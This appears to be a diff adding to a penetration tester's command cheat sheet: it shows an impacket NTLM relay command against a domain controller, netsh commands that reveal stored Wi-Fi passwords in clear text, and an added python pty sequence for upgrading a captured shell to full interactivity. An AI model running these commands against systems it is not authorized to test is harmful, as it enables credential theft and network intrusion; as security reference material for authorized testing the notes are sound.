@@ -133,3 +133,9 @@ impacket-ntlmrelayx -6 -t ldaps://[DC IP] -wh fakewpad.[DOMAIN] -l enumeration
 # finding loot - windows - wifi - grab wifi passwords
 netsh wlan show profile
 netsh wlan show profile <SSID> key=clear
+
+# upgrade shell to fully interactive - python
+python -c 'import pty;pty.spawn("/bin/bash");'
+#CTRL+Z
+stty raw -echo
+fg # this will be invisible
